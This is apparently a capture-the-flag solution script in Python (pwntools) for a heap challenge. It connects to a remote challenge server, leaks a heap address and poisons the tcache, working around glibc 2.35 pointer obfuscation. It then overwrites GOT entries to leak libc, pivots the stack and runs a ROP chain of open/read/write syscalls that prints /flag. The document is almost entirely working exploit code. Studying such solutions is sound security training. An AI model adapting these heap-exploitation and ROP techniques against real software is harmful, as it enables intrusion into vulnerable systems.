# https://ctftime.org/writeup/34804
# https://github.com/nobodyisnobody/write-ups/tree/main/0CTF.TCTF.2022/pwn/babyheap
# https://github.com/shellphish/how2heap/blob/master/glibc_2.35/tcache_poisoning.c

from pwn import *
#io = process("./chall",aslr=True)
io = remote("34.124.157.94",12346)
libc = ELF("./lib/libc.so.6")

def writeBook(index,content):
    io.sendlineafter("Option:","1")
    io.sendlineafter("Index:",str(index))
    io.sendafter("long!",content)

def rewriteBook(index,content):
    io.sendlineafter("Option:","2")
    io.sendlineafter("Index:",str(index))
    io.sendafter("before.",content)

def throwBook(index):
    io.sendlineafter("Option:","3")
    io.sendlineafter("Index:",str(index))


def obfs(pos,ptr):
    # new glibc 2.35 pointer obfuscation
    return p64((pos >> 12) ^ ptr)


def newGot(index,value):
    got = b""
    for i in range(15):
        if i != index:
            got += p64(0x401030 + i*0x10)
        else:
            got += value

    return got


books = 0x4040e0
freeGot = 0x404018
printfGot = 0x404050
putsPlt = 0x401150
newStack = 0x404800
flagPath = 0x404200

io.sendlineafter("> ",b"\x01\x41")

# extend overflow
writeBook(1,"A"*8) # 0x408d00
writeBook(2,"A")
writeBook(3,"A")

io.sendlineafter("Option:",str(1337))
io.sendlineafter("What is your favourite number?","3")
io.recvuntil("You found a secret message: ")
freeChunkPos = int(io.recvline()[:-1],16)
log.info("FREE CHUNK POS: " + hex(freeChunkPos))


rewriteBook(1,"A"*0x14)

# tcache poisoning
# free a 0x20 chunk into tcache
throwBook(1)

throwBook(2)
throwBook(3) # another 0x20 chunk in tcache


target = books

heapChunk  = p64(0) + p64(0x21)
heapChunk += obfs(freeChunkPos,target) # fd

writeBook(1,b"A"*0x20) # use this chunk to overwrite the free tcache chunk
rewriteBook(1,b"A"*0x10 + heapChunk)

writeBook(2,b"A") # dummy chunk
writeBook(3,b"A") # should return target

# Got arbitary write now. 
# Can upgrade to arbitary read

# make the books overwrite larger
booksArr  = p64(0xffffffff) + p64(books)
rewriteBook(3,booksArr)

# make index 2 = freeGot, index 3 = printfGot, index 4 = newStack , index 5 = flagPath
booksArr += p64(0xffffffff) + p64(freeGot) 
booksArr += p64(0xffffffff) + p64(printfGot)
booksArr += p64(0xffffffff) + p64(newStack)
booksArr += p64(0xffffffff) + p64(flagPath)
rewriteBook(1,booksArr)

# overwrite free@got -> putsPlt
rewriteBook(2,newGot(0,p64(putsPlt)))

# leak libc
throwBook(3)
io.recv()
libc.address = u64(io.recv(6).ljust(8,b"\x00")) - libc.symbols["printf"]
log.info("LIBC BASE: " + hex(libc.address))


# rop gadgets
popRdx = p64(libc.address + 0x90529) # pop rdx ; pop rbx ; ret
stackPivot = p64(libc.address + 0x5a170) # mov rsp, rdx ; ret
pop3 = p64(libc.address + 0x108b13) # pop rdx ; pop rcx ; pop rbx ; ret


def syscall(rax,rdi,rsi,rdx):
    popRax = p64(libc.address + 0x45eb0) # pop rax ; ret
    popRdi = p64(libc.address + 0x2a3e5) # pop rdi ; ret
    popRsi = p64(libc.address + 0x2be51) # pop rsi ; ret
    popRdx = p64(libc.address + 0x90529) # pop rdx ; pop rbx ; ret
    syscall = p64(libc.address + 0x91396) # syscall; ret;

    syscallRop  = popRax + p64(rax) + popRdi + p64(rdi) + popRsi + p64(rsi)
    syscallRop += popRdx + p64(rdx) + p64(0) + syscall

    return syscallRop



# write "/flag" to flag path
rewriteBook(5,"/flag\x00")

# write ropchain to the new stack
rop  = syscall(2,flagPath,0,0)
rop += syscall(0,3,flagPath,0x100)
rop += syscall(1,1,flagPath,0x100)

rewriteBook(4,rop)


# overwrite malloc@got to pop3, and using that to pivot stack to 0x404800
# cause when malloc is called:
# 0x00007fffffffdfe8│+0x0000: 0x0000000000401632  →  <write_book+266> mov rcx, rax         ← $rsp
# 0x00007fffffffdff0│+0x0008: 0x00000000004020b8  →  "4. Exit the library"
# 0x00007fffffffdff8│+0x0010: 0x0000000000000021 ("!"?)
# 0x00007fffffffe000│+0x0018: "AAAAAAAABBBBBBBB\n"         ← $rsi

rewriteBook(2,newGot(13,pop3))

# pivot stack
pivotChain = popRdx + p64(newStack) + p64(0) + stackPivot
#gdb.attach(io,gdbscript="x/40wx &books \n break *0x4011f0")
writeBook(10,pivotChain)

io.interactive()
